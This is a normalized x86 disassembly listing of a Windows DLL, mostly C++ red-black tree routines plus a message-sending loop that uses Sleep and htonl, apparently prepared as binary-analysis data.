mov eax [ edi + 0x4 ]
test eax eax
je r-xdata
mov ecx esi
mov ebx [ ebp - 0x4 ]
test edi edi
je r-xdata
xor eax eax
mov edi edx
[ edi ]
mov edi [ ebp - 0x8 ]
add [ edi + 0x8 ] esi
mov [ edi + 0x4 ] ebx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
push eax
call j_sub_1003f3e3#2
add esp 0x4
mov ecx edi
mov edi ebx
jmp r-xdata
xor eax eax
[ edi ]
sub_1002a520
push ebp
mov ebp esp
sub esp 0x8
mov eax [ ebp + 0xc ]
push ebx
push esi
mov ebx ecx
mov [ ebp - 0x4 ] eax
push edi
lea ecx [ ebp + 0xc ]
call sub_1002a8d0
mov ecx [ ebp - 0x4 ]
mov esi [ ecx ]
cmp [ esi + 0xd ] 0x0
je r-xdata
mov eax [ ecx + 0x8 ]
cmp [ eax + 0xd ] 0x0
je r-xdata
mov edi [ ecx + 0x8 ]
jmp r-xdata
mov edx [ ebp + 0xc ]
mov edi [ edx + 0x8 ]
cmp edx ecx
jne r-xdata
mov edi esi
jmp r-xdata
cmp [ edi + 0xd ] 0x0
mov esi [ ecx + 0x4 ]
jne r-xdata
mov [ esi + 0x4 ] edx
mov eax [ ecx ]
mov [ edx ] eax
cmp edx [ ecx + 0x8 ]
jne r-xdata
mov eax [ ebx ]
cmp [ eax + 0x4 ] ecx
jne r-xdata
mov [ edi + 0x4 ] esi
cmp [ edi + 0xd ] 0x0
mov esi [ edx + 0x4 ]
jne r-xdata
mov esi edx
jmp r-xdata
cmp [ esi ] ecx
jne r-xdata
mov [ eax + 0x4 ] edi
jmp r-xdata
mov [ esi ] edi
mov eax [ ecx + 0x8 ]
mov [ edx + 0x8 ] eax
mov eax [ ecx + 0x8 ]
mov [ eax + 0x4 ] edx
mov [ edi + 0x4 ] esi
mov eax [ ebx ]
cmp [ eax + 0x4 ] ecx
jne r-xdata
mov [ esi + 0x8 ] edi
mov [ esi ] edi
jmp r-xdata
mov eax [ ebx ]
cmp [ eax ] ecx
jne r-xdata
mov eax [ ecx + 0x4 ]
cmp [ eax ] ecx
jne r-xdata
mov [ eax + 0x4 ] edx
jmp r-xdata
mov eax [ ebx ]
cmp [ eax + 0x8 ] ecx
jne r-xdata
cmp [ edi + 0xd ] 0x0
je r-xdata
mov [ eax + 0x8 ] edx
mov [ eax ] edx
jmp r-xdata
mov eax [ ecx + 0x4 ]
mov [ edx + 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov cl [ edx + 0xc ]
mov al [ eax + 0xc ]
mov [ edx + 0xc ] al
mov eax [ ebp - 0x4 ]
mov [ eax + 0xc ] cl
mov ecx eax
cmp [ ecx + 0xc ] 0x1
jne r-xdata
cmp [ edi + 0xd ] 0x0
je r-xdata
mov eax [ edi ]
mov edx edi
cmp [ eax + 0xd ] 0x0
jne r-xdata
mov edx esi
jmp r-xdata
push ecx
call j_sub_1003f3e3#2
mov eax [ ebx + 0x4 ]
add esp 0x4
mov ecx [ ebp + 0xc ]
test eax eax
je r-xdata
mov eax [ ebx ]
cmp edi [ eax + 0x4 ]
je r-xdata
mov eax [ edi + 0x8 ]
mov edx edi
cmp [ eax + 0xd ] 0x0
jne r-xdata
mov edx esi
mov [ eax + 0x8 ] edx
jmp r-xdata
mov eax [ ebx ]
mov edx eax
mov eax [ edx ]
cmp [ eax + 0xd ] 0x0
je r-xdata
mov [ eax ] edx
mov eax [ ebp + 0x8 ]
pop edi
pop esi
pop ebx
mov [ eax ] ecx
mov esp ebp
pop ebp
retn 0x8
dec eax
mov [ ebx + 0x4 ] eax
mov [ edi + 0xc ] 0x1
lea ebx [ ebx ]
mov eax [ ebx ]
mov [ eax + 0x8 ] edx
jmp r-xdata
mov edx eax
mov eax [ edx + 0x8 ]
cmp [ eax + 0xd ] 0x0
je r-xdata
mov ecx [ ebp - 0x4 ]
mov ecx [ esi ]
cmp edi ecx
jne r-xdata
cmp [ ecx + 0xc ] 0x0
jne r-xdata
mov ecx [ esi + 0x8 ]
cmp [ ecx + 0xc ] 0x0
jne r-xdata
cmp [ ecx + 0xd ] 0x0
jne r-xdata
mov [ ecx + 0xc ] 0x1
mov ecx ebx
push esi
mov [ esi + 0xc ] 0x0
call sub_1002a870
mov ecx [ esi ]
cmp [ ecx + 0xd ] 0x0
jne r-xdata
mov [ ecx + 0xc ] 0x1
mov ecx ebx
push esi
mov [ esi + 0xc ] 0x0
call sub_1002a810
mov ecx [ esi + 0x8 ]
mov eax [ ebx ]
mov edi esi
mov esi [ esi + 0x4 ]
cmp edi [ eax + 0x4 ]
jne r-xdata
mov eax [ ecx + 0x8 ]
cmp [ eax + 0xc ] 0x1
jne r-xdata
mov eax [ ecx ]
cmp [ eax + 0xc ] 0x1
jne r-xdata
cmp [ edi + 0xc ] 0x1
jne r-xdata
jmp r-xdata
mov eax [ ecx ]
cmp [ eax + 0xc ] 0x1
jne r-xdata
mov eax [ ecx ]
cmp [ eax + 0xc ] 0x1
jne r-xdata
mov eax [ ecx + 0x8 ]
cmp [ eax + 0xc ] 0x1
jne r-xdata
mov eax [ ecx + 0x8 ]
cmp [ eax + 0xc ] 0x1
je r-xdata
mov al [ esi + 0xc ]
mov [ ecx + 0xc ] al
mov [ esi + 0xc ] 0x1
mov eax [ ecx ]
mov ecx ebx
push esi
mov [ eax + 0xc ] 0x1
call sub_1002a870
mov eax [ ecx + 0x8 ]
push ecx
mov [ eax + 0xc ] 0x1
mov [ ecx + 0xc ] 0x0
mov ecx ebx
call sub_1002a810
mov ecx [ esi ]
mov [ ecx + 0xc ] 0x0
mov al [ esi + 0xc ]
mov [ ecx + 0xc ] al
mov [ esi + 0xc ] 0x1
mov eax [ ecx + 0x8 ]
mov ecx ebx
push esi
mov [ eax + 0xc ] 0x1
call sub_1002a810
jmp r-xdata
mov eax [ ecx ]
push ecx
mov [ eax + 0xc ] 0x1
mov [ ecx + 0xc ] 0x0
mov ecx ebx
call sub_1002a870
mov ecx [ esi + 0x8 ]
sub_1002a790
push ebp
mov ebp esp
push ebx
mov ebx [ ecx ]
mov edx ebx
mov eax [ ebx + 0x4 ]
mov ecx eax
cmp [ ecx + 0xd ] 0x0
jne r-xdata
cmp [ edx + 0xd ] 0x0
jne r-xdata
push esi
push edi
mov edi [ ebp + 0xc ]
mov edi [ edi ]
lea ebx [ ebx ]
cmp [ eax + 0xd ] 0x0
jne r-xdata
mov eax [ edx ]
cmp [ edx + 0xd ] 0x0
je r-xdata
mov ecx [ ecx + 0x8 ]
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax ] ebx
mov [ eax + 0x4 ] edx
pop ebx
pop ebp
retn 0x8
mov ecx [ ebp + 0xc ]
mov ecx [ ecx ]
mov ebx ecx
mov ecx [ ecx ]
cmp edi esi
cmovb edx ecx
cmp [ ecx + 0xd ] 0x0
je r-xdata
mov eax [ eax + 0x8 ]
mov edx eax
mov eax [ eax ]
jmp r-xdata
mov esi [ ecx + 0x10 ]
cmp esi edi
jae r-xdata
pop edi
pop esi
cmp ecx [ eax + 0x10 ]
jae r-xdata
cmp [ eax + 0xd ] 0x0
je r-xdata
sub_1002a810
push ebp
mov ebp esp
mov edx [ ebp + 0x8 ]
push esi
mov esi [ edx + 0x8 ]
mov eax [ esi ]
mov [ edx + 0x8 ] eax
mov eax [ esi ]
cmp [ eax + 0xd ] 0x0
jne r-xdata
mov eax [ edx + 0x4 ]
mov [ esi + 0x4 ] eax
mov eax [ ecx ]
cmp edx [ eax + 0x4 ]
jne r-xdata
mov [ eax + 0x4 ] edx
mov eax [ edx + 0x4 ]
cmp edx [ eax ]
jne r-xdata
mov [ eax + 0x4 ] esi
mov [ esi ] edx
mov [ edx + 0x4 ] esi
pop esi
pop ebp
retn 0x4
mov [ eax + 0x8 ] esi
mov [ esi ] edx
mov [ edx + 0x4 ] esi
pop esi
pop ebp
retn 0x4
mov [ eax ] esi
mov [ esi ] edx
mov [ edx + 0x4 ] esi
pop esi
pop ebp
retn 0x4
sub_1002a870
push ebp
mov ebp esp
mov edx [ ebp + 0x8 ]
push esi
mov esi [ edx ]
mov eax [ esi + 0x8 ]
mov [ edx ] eax
mov eax [ esi + 0x8 ]
cmp [ eax + 0xd ] 0x0
jne r-xdata
mov eax [ edx + 0x4 ]
mov [ esi + 0x4 ] eax
mov eax [ ecx ]
cmp edx [ eax + 0x4 ]
jne r-xdata
mov [ eax + 0x4 ] edx
mov eax [ edx + 0x4 ]
cmp edx [ eax + 0x8 ]
jne r-xdata
mov [ eax + 0x4 ] esi
mov [ esi + 0x8 ] edx
mov [ edx + 0x4 ] esi
pop esi
pop ebp
retn 0x4
mov [ eax ] esi
mov [ esi + 0x8 ] edx
mov [ edx + 0x4 ] esi
pop esi
pop ebp
retn 0x4
mov [ eax + 0x8 ] esi
mov [ esi + 0x8 ] edx
mov [ edx + 0x4 ] esi
pop esi
pop ebp
retn 0x4
sub_1002a8d0
mov edx ecx
mov eax [ edx ]
cmp [ eax + 0xd ] 0x0
jne r-xdata
mov eax edx
retn
mov ecx [ eax + 0x8 ]
cmp [ ecx + 0xd ] 0x0
jne r-xdata
mov eax [ eax + 0x4 ]
cmp [ eax + 0xd ] 0x0
jne r-xdata
mov eax [ ecx ]
cmp [ eax + 0xd ] 0x0
jne r-xdata
mov [ edx ] eax
mov ecx [ edx ]
cmp ecx [ eax + 0x8 ]
jne r-xdata
mov [ edx ] ecx
mov eax edx
retn
jmp r-xdata
mov [ edx ] eax
mov eax [ eax + 0x4 ]
cmp [ eax + 0xd ] 0x0
je r-xdata
mov ecx eax
mov eax [ ecx ]
cmp [ eax + 0xd ] 0x0
je r-xdata
sub_1002a920
push ebp
mov ebp esp
push 0xffffffff
push sub_10050fe0
mov eax [ fs : 0x0 ]
push eax
sub esp 0xc
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov [ ebp - 0x10 ] esp
push 0x18
call sub_1003cdeb
add esp 0x4
mov esi eax
mov [ ebp - 0x18 ] esi
test esi esi
jne r-xdata
mov [ ebp - 0x14 ] esi
mov [ ebp - 0x4 ] 0x0
lea eax [ ebp - 0x14 ]
push eax
push esi
call sub_1002a9d0
lea eax [ ebp - 0x14 ]
push eax
lea eax [ esi + 0x4 ]
push eax
call sub_1002a9d0
lea eax [ ebp - 0x14 ]
push eax
lea eax [ esi + 0x8 ]
push eax
call sub_1002a9d0
mov [ ebp - 0x4 ] 0xffffffff
mov [ esi + 0xc ] 0x101
mov eax esi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
call sub_1003c58d
sub_1002a9d0
push ebp
mov ebp esp
push 0xffffffff
push sub_1004b941
mov eax [ fs : 0x0 ]
push eax
push ecx
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov ecx [ ebp + 0x8 ]
mov [ ebp - 0x10 ] ecx
mov [ ebp - 0x4 ] 0x0
test ecx ecx
je r-xdata
mov [ ebp - 0x4 ] 0xffffffff
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
mov esp ebp
pop ebp
retn 0x8
mov eax [ ebp + 0xc ]
mov eax [ eax ]
mov [ ecx ] eax
sub_1002aa30
push ebp
mov ebp esp
push 0xffffffff
push sub_10051011
mov eax [ fs : 0x0 ]
push eax
sub esp 0x10
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov [ ebp - 0x10 ] esp
call sub_1002abf0
mov esi eax
mov [ ebp - 0x14 ] esi
mov [ esi + 0xc ] 0x0
mov [ ebp - 0x4 ] 0x0
lea edx [ esi + 0x10 ]
mov [ ebp - 0x18 ] edx
mov [ ebp - 0x1c ] edx
mov [ ebp - 0x4 ] 0x1
test edx edx
je r-xdata
mov [ ebp - 0x4 ] 0x0
mov [ ebp - 0x4 ] 0xffffffff
mov eax esi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
mov ecx [ ebp + 0x8 ]
mov eax [ ecx ]
mov [ edx ] eax
mov eax [ ecx + 0x4 ]
mov [ edx + 0x4 ] eax
sub_1002aad0
push ebp
mov ebp esp
push 0xffffffff
push sub_10051030
mov eax [ fs : 0x0 ]
push eax
sub esp 0x10
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov [ ebp - 0x10 ] esp
mov [ ebp - 0x1c ] ecx
xor ah ah
mov [ ebp - 0x11 ] ah
mov [ ebp - 0x4 ] 0x0
mov edi [ ecx ]
mov edx [ edi + 0x4 ]
mov al 0x1
mov [ ebp - 0x15 ] al
mov ebx [ ebp + 0x10 ]
mov esi edi
mov [ ebp + 0x10 ] esi
test al al
je r-xdata
mov edi edx
test ah ah
je r-xdata
mov eax [ esi + 0x10 ]
push [ ebp + 0x14 ]
cmp eax [ ebx ]
jae r-xdata
mov eax [ ecx ]
cmp edi [ eax ]
jne r-xdata
mov eax [ ebx ]
cmp eax [ edx + 0x10 ]
setb al
mov eax [ edx + 0x10 ]
cmp eax [ ebx ]
setae al
jmp r-xdata
call j_sub_1003f3e3#2
add esp 0x4
mov eax [ ebp + 0x8 ]
mov [ eax ] esi
mov [ eax + 0x4 ] 0x0
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x10
push ecx
push edi
push [ ebp - 0x15 ]
jmp r-xdata
lea ecx [ ebp + 0x10 ]
call sub_1002ac90
mov esi [ ebp + 0x10 ]
mov ecx [ ebp - 0x1c ]
push [ ebp + 0x14 ]
push ecx
push edi
push 0x1
mov edx [ edx + 0x8 ]
mov ah [ ebp - 0x11 ]
jmp r-xdata
mov edx [ edx ]
mov ah [ ebp - 0x11 ]
jmp r-xdata
mov [ ebp - 0x15 ] al
test al al
je r-xdata
lea eax [ ebp + 0x10 ]
push eax
call sub_1002acf0
mov ecx [ eax ]
mov eax [ ebp + 0x8 ]
mov [ eax ] ecx
mov [ eax + 0x4 ] 0x1
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x10
cmp [ edx + 0xd ] 0x0
jne r-xdata
sub_1002abf0
push ebp
mov ebp esp
push 0xffffffff
push sub_10051050
mov eax [ fs : 0x0 ]
push eax
sub esp 0x8
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov [ ebp - 0x10 ] esp
mov edi ecx
push 0x18
call sub_1003cdeb
add esp 0x4
mov esi eax
mov [ ebp - 0x14 ] esi
test esi esi
jne r-xdata
mov [ ebp - 0x4 ] 0x0
push edi
push esi
call sub_1002a9d0
push edi
lea eax [ esi + 0x4 ]
push eax
call sub_1002a9d0
push edi
lea eax [ esi + 0x8 ]
push eax
call sub_1002a9d0
mov [ ebp - 0x4 ] 0xffffffff
mov eax esi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
call sub_1003c58d
sub_1002ac90
mov edx ecx
mov eax [ edx ]
cmp [ eax + 0xd ] 0x0
je r-xdata
mov ecx [ eax ]
cmp [ ecx + 0xd ] 0x0
jne r-xdata
mov eax [ eax + 0x8 ]
mov [ edx ] eax
mov eax edx
retn
mov ecx [ eax + 0x4 ]
cmp [ ecx + 0xd ] 0x0
jne r-xdata
mov eax [ ecx + 0x8 ]
cmp [ eax + 0xd ] 0x0
jne r-xdata
mov eax [ edx ]
cmp [ eax + 0xd ] 0x0
jne r-xdata
lea esp [ esp ]
mov [ edx ] ecx
mov ecx eax
mov eax [ ecx + 0x8 ]
cmp [ eax + 0xd ] 0x0
je r-xdata
mov eax edx
retn
mov [ edx ] ecx
mov ecx [ ecx + 0x4 ]
cmp [ ecx + 0xd ] 0x0
je r-xdata
mov [ edx ] ecx
mov eax edx
retn
mov eax [ edx ]
cmp eax [ ecx ]
jne r-xdata
sub_1002acf0
push ebp
mov ebp esp
push ebx
push edi
mov edi ecx
mov eax [ edi + 0x4 ]
cmp eax 0xaaaaaa9
jae r-xdata
push [ ebp + 0x18 ]
call j_sub_1003f3e3#2
add esp 0x4
push r--data
call sub_1003c5be
mov ebx [ ebp + 0x18 ]
inc eax
mov [ edi + 0x4 ] eax
mov eax [ ebp + 0x10 ]
mov [ ebx + 0x4 ] eax
mov ecx [ edi ]
cmp eax ecx
jne r-xdata
cmp [ ebp + 0xc ] 0x0
je r-xdata
mov [ ecx + 0x4 ] ebx
mov eax [ edi ]
mov [ eax ] ebx
mov eax [ edi ]
mov [ eax + 0x8 ] ebx
jmp r-xdata
mov [ eax + 0x8 ] ebx
mov ecx [ edi ]
cmp eax [ ecx + 0x8 ]
jne r-xdata
mov [ eax ] ebx
mov ecx [ edi ]
cmp eax [ ecx ]
jne r-xdata
mov ecx [ ebx + 0x4 ]
mov eax ebx
cmp [ ecx + 0xc ] 0x0
jne r-xdata
mov [ ecx + 0x8 ] ebx
mov [ ecx ] ebx
jmp r-xdata
mov eax [ edi ]
pop edi
mov eax [ eax + 0x4 ]
mov [ eax + 0xc ] 0x1
mov eax [ ebp + 0x8 ]
mov [ eax ] ebx
pop ebx
pop ebp
retn 0x14
push esi
cmp [ edx + 0xc ] 0x0
jne r-xdata
mov edx [ esi + 0x8 ]
cmp [ edx + 0xc ] 0x0
je r-xdata
cmp eax [ ecx ]
jne r-xdata
mov [ ecx + 0xc ] 0x1
mov [ edx + 0xc ] 0x1
mov ecx [ eax + 0x4 ]
mov ecx [ ecx + 0x4 ]
mov [ ecx + 0xc ] 0x0
mov ecx [ eax + 0x4 ]
mov eax [ ecx + 0x4 ]
jmp r-xdata
cmp eax [ ecx + 0x8 ]
jne r-xdata
mov ecx [ eax + 0x4 ]
mov [ ecx + 0xc ] 0x1
mov ecx [ eax + 0x4 ]
mov ecx [ ecx + 0x4 ]
mov [ ecx + 0xc ] 0x0
mov ecx [ eax + 0x4 ]
mov edx [ ecx + 0x4 ]
mov esi [ edx + 0x8 ]
mov ecx [ esi ]
mov [ edx + 0x8 ] ecx
mov ecx [ esi ]
cmp [ ecx + 0xd ] 0x0
jne r-xdata
mov eax ecx
mov edx [ eax ]
mov ecx [ edx + 0x8 ]
mov [ eax ] ecx
mov ecx [ edx + 0x8 ]
cmp [ ecx + 0xd ] 0x0
jne r-xdata
mov ecx [ eax + 0x4 ]
cmp [ ecx + 0xc ] 0x0
je r-xdata
mov ecx [ eax + 0x4 ]
mov [ ecx + 0xc ] 0x1
mov ecx [ eax + 0x4 ]
mov ecx [ ecx + 0x4 ]
mov [ ecx + 0xc ] 0x0
mov ecx [ eax + 0x4 ]
mov edx [ ecx + 0x4 ]
mov esi [ edx ]
mov ecx [ esi + 0x8 ]
mov [ edx ] ecx
mov ecx [ esi + 0x8 ]
cmp [ ecx + 0xd ] 0x0
jne r-xdata
mov eax ecx
mov edx [ eax + 0x8 ]
mov ecx [ edx ]
mov [ eax + 0x8 ] ecx
mov ecx [ edx ]
cmp [ ecx + 0xd ] 0x0
jne r-xdata
mov ecx [ edx + 0x4 ]
mov [ esi + 0x4 ] ecx
mov ecx [ edi ]
cmp edx [ ecx + 0x4 ]
jne r-xdata
mov [ ecx + 0x4 ] edx
mov ecx [ eax + 0x4 ]
mov [ edx + 0x4 ] ecx
mov ecx [ edi ]
cmp eax [ ecx + 0x4 ]
jne r-xdata
mov [ ecx + 0x4 ] eax
mov ecx [ eax + 0x4 ]
mov esi [ ecx + 0x4 ]
mov edx [ esi ]
cmp ecx edx
jne r-xdata
pop esi
mov ecx [ edx + 0x4 ]
mov [ esi + 0x4 ] ecx
mov ecx [ edi ]
cmp edx [ ecx + 0x4 ]
jne r-xdata
mov [ ecx + 0x4 ] edx
mov ecx [ eax + 0x4 ]
mov [ edx + 0x4 ] ecx
mov ecx [ edi ]
cmp eax [ ecx + 0x4 ]
jne r-xdata
mov [ ecx + 0x4 ] eax
mov ecx [ edx + 0x4 ]
cmp edx [ ecx ]
jne r-xdata
mov [ ecx + 0x4 ] esi
jmp r-xdata
mov ecx [ eax + 0x4 ]
cmp eax [ ecx + 0x8 ]
jne r-xdata
mov [ ecx + 0x4 ] edx
jmp r-xdata
mov ecx [ edx + 0x4 ]
cmp edx [ ecx + 0x8 ]
jne r-xdata
mov [ ecx + 0x4 ] esi
mov [ esi + 0x8 ] edx
jmp r-xdata
mov ecx [ eax + 0x4 ]
cmp eax [ ecx ]
jne r-xdata
mov [ ecx + 0x4 ] edx
jmp r-xdata
mov [ ecx + 0x8 ] esi
mov [ ecx ] esi
jmp r-xdata
mov [ esi ] edx
mov [ ecx ] edx
mov [ ecx + 0x8 ] edx
jmp r-xdata
mov [ edx + 0x8 ] eax
mov [ eax + 0x4 ] edx
mov [ ecx ] esi
mov [ esi + 0x8 ] edx
jmp r-xdata
mov [ ecx + 0x8 ] esi
mov [ esi + 0x8 ] edx
jmp r-xdata
mov [ edx + 0x4 ] esi
mov [ ecx + 0x8 ] edx
mov [ ecx ] edx
jmp r-xdata
mov [ edx ] eax
mov [ eax + 0x4 ] edx
sub_1002af10
push ebp
mov ebp esp
test [ ebp + 0x8 ] 0x1
push esi
mov esi ecx
mov [ esi ] r--data
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call j_sub_1003f3e3#2
add esp 0x4
sub_1002af60
push ebp
mov ebp esp
and esp 0xfffffff8
push 0xffffffff
push sub_1005107b
mov eax [ fs : 0x0 ]
push eax
sub esp 0x6f8
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0x6f0 ] eax
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax esp
push eax
lea eax [ esp + 0x708 ]
mov [ fs : 0x0 ] eax
mov ebx ecx
mov eax [ ebx ]
call [ eax + 0x18 ]
test eax eax
jne r-xdata
mov ecx [ esp + 0x708 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ esp + 0x6f0 ]
xor ecx esp
call sub_1003c623
mov esp ebp
pop ebp
retn
nop
push 0x1
call [ Sleep@IAT ]
mov eax [ ebx ]
mov ecx ebx
call [ eax + 0x18 ]
test eax eax
je r-xdata
lea ebx [ ebx ]
mov eax [ ebx + 0x14 ]
lea edx [ esp + 0x18 ]
mov [ esp + 0x10 ] 0x0
mov [ esp + 0x18 ] 0x0
mov [ esp + 0x14 ] 0x0
mov ecx [ eax + 0x4 ]
push edx
lea edx [ esp + 0x18 ]
push edx
mov eax [ ecx ]
lea edx [ esp + 0x18 ]
push edx
call [ eax + 0x10 ]
test eax eax
je r-xdata
mov ecx [ esp + 0x10 ]
test ecx ecx
je r-xdata
mov ecx [ esp + 0x10 ]
mov esi 0x6c8
mov edi [ esp + 0x2c ]
mov eax [ ecx ]
call [ eax + 0xc ]
sub eax edi
cmp eax esi
jae r-xdata
push [ esp + 0x18 ]
lea eax [ esp + 0x20 ]
mov ecx ebx
push [ esp + 0x18 ]
push eax
call sub_1002b150
mov [ esp + 0x710 ] 0xffffffff
cmp [ esp + 0x30 ] 0x10
jb r-xdata
mov eax [ ecx ]
push 0x1
call [ eax ]
mov ecx [ esp + 0x10 ]
lea edx [ esp + 0x34 ]
push esi
push edx
push [ esp + 0x34 ]
mov eax [ ecx ]
call [ eax + 0x14 ]
cmp eax esi
jne r-xdata
mov ecx [ esp + 0x10 ]
mov edi [ esp + 0x2c ]
mov eax [ ecx ]
call [ eax + 0xc ]
mov esi eax
sub esi edi
mov eax [ ebx + 0x14 ]
lea edx [ esp + 0x18 ]
push edx
lea edx [ esp + 0x18 ]
mov [ esp + 0x34 ] 0xf
push edx
mov ecx [ eax + 0x4 ]
lea edx [ esp + 0x18 ]
push edx
mov [ esp + 0x38 ] 0x0
mov [ esp + 0x28 ] 0x0
mov eax [ ecx ]
call [ eax + 0x10 ]
test eax eax
jne r-xdata
push [ esp + 0x1c ]
call j_sub_1003f3e3#2
add esp 0x4
push eax
lea eax [ esp + 0x38 ]
push eax
lea ecx [ esp + 0x24 ]
call sub_10005470
mov ecx [ esp + 0x10 ]
mov esi [ esp + 0x2c ]
mov eax [ ecx ]
call [ eax + 0xc ]
cmp esi eax
jb r-xdata
mov [ esp + 0x2c ] 0x0
mov [ esp + 0x30 ] 0x0
mov [ esp + 0x30 ] 0xf
mov [ esp + 0x2c ] 0x0
mov [ esp + 0x1c ] 0x0
mov [ esp + 0x710 ] 0x0
mov ecx [ esp + 0x10 ]
mov esi [ esp + 0x2c ]
mov eax [ ecx ]
call [ eax + 0xc ]
cmp esi eax
jae r-xdata
sub_1002b150
push ebp
mov ebp esp
push 0xffffffff
push sub_100510c3
mov eax [ fs : 0x0 ]
push eax
sub esp 0x28
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x14 ] eax
push ebx
push esi
push edi
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov esi ecx
test [ ebp + 0xc ] 0x1
mov edi [ ebp + 0x8 ]
mov ebx [ ebp + 0x10 ]
je r-xdata
inc [ esi + 0x18 ]
jne r-xdata
push ebx
push edi
call sub_1002b270
jmp r-xdata
mov eax [ esi + 0x14 ]
mov ecx [ eax + 0x8 ]
movzx eax [ esi + 0x18 ]
push eax
push edi
mov edx [ ecx ]
lea eax [ ebp - 0x2c ]
push eax
call [ edx + 0xc ]
mov [ ebp - 0x4 ] 0x0
push 0x18
call sub_1003cdeb
add esp 0x4
mov [ ebp - 0x30 ] eax
mov [ ebp - 0x4 ] 0x1
test eax eax
je r-xdata
mov eax 0x1
mov [ esi + 0x18 ] ax
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x14 ]
xor ecx ebp
call sub_1003c623
mov esp ebp
pop ebp
retn 0xc
xor edi edi
push [ ebp - 0x1c ]
mov ecx eax
call sub_10037bc0
mov edi eax
jmp r-xdata
mov [ ebp - 0x18 ] 0xf
mov [ ebp - 0x1c ] 0x0
mov [ ebp - 0x2c ] 0x0
push [ ebp - 0x2c ]
call j_sub_1003f3e3#2
add esp 0x4
mov [ ebp - 0x4 ] 0x0
lea ecx [ ebp - 0x2c ]
cmp [ ebp - 0x18 ] 0x10
push [ ebp - 0x1c ]
cmovae ecx [ ebp - 0x2c ]
mov eax [ edi ]
push ecx
push 0x0
mov ecx edi
call [ eax + 0x10 ]
cmp [ ebp - 0x18 ] 0x10
lea eax [ ebp - 0x2c ]
mov [ ebp - 0x1c ] 0x0
cmovae eax [ ebp - 0x2c ]
push 0x0
push edi
push ebx
mov [ eax ] 0x0
mov eax [ esi + 0x14 ]
mov ecx [ eax + 0x4 ]
mov eax [ ecx ]
call [ eax + 0x14 ]
mov [ ebp - 0x4 ] 0xffffffff
cmp [ ebp - 0x18 ] 0x10
jb r-xdata
sub_1002b270
push ebp
mov ebp esp
push 0xffffffff
push sub_100510fb
mov eax [ fs : 0x0 ]
push eax
push ecx
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov ebx ecx
mov esi [ ebp + 0x8 ]
cmp [ esi + 0x10 ] 0x0
jbe r-xdata
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
cmp [ esi + 0x14 ] 0x10
jb r-xdata
mov eax esi
mov eax [ esi ]
jmp r-xdata
mov eax [ ebx + 0x14 ]
mov ecx [ eax + 0x8 ]
mov eax [ ecx ]
call [ eax + 0x8 ]
mov ecx 0x7ffffff
cmp eax ecx
cmova eax ecx
push eax
mov [ ebp + 0x8 ] eax
call [ htonl@IAT ]
push 0x18
mov [ ebp + 0x8 ] eax
call sub_1003cdeb
add esp 0x4
mov [ ebp - 0x10 ] eax
mov [ ebp - 0x4 ] 0x0
test eax eax
je r-xdata
cmp [ eax ] 0x1
jne r-xdata
xor edi edi
push 0x5
mov ecx eax
call sub_10037bc0
mov edi eax
jmp r-xdata
mov eax [ edi ]
mov ecx edi
push 0x1
push esi
push 0x0
call [ eax + 0x10 ]
mov eax [ edi ]
lea ecx [ ebp + 0x8 ]
push 0x4
push ecx
push 0x1
mov ecx edi
call [ eax + 0x10 ]
mov eax [ ebx + 0x14 ]
push 0x1
push edi
push [ ebp + 0xc ]
mov ecx [ eax + 0x4 ]
mov eax [ ecx ]
call [ eax + 0x14 ]
mov eax [ ebx + 0x14 ]
mov ecx [ eax + 0x8 ]
mov eax [ ecx ]
call [ eax + 0x8 ]
mov esi [ esi ]
mov [ ebp - 0x4 ] 0xffffffff
cmp [ esi + 0x14 ] 0x10
jb r-xdata
sub_1002b360
push ebp
mov ebp esp
push 0xffffffff
push sub_10051130
mov eax [ fs : 0x0 ]
push eax
push ecx
push esi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov esi ecx
mov [ ebp - 0x10 ] esi
mov [ esi ] r--data
mov [ ebp - 0x4 ] 0xffffffff
mov [ esi ] r--data
mov [ ebp - 0x4 ] 0x1
mov eax [ esi + 0x10 ]
test eax eax
je r-xdata
mov [ ebp - 0x4 ] 0xffffffff
test [ ebp + 0x8 ] 0x1
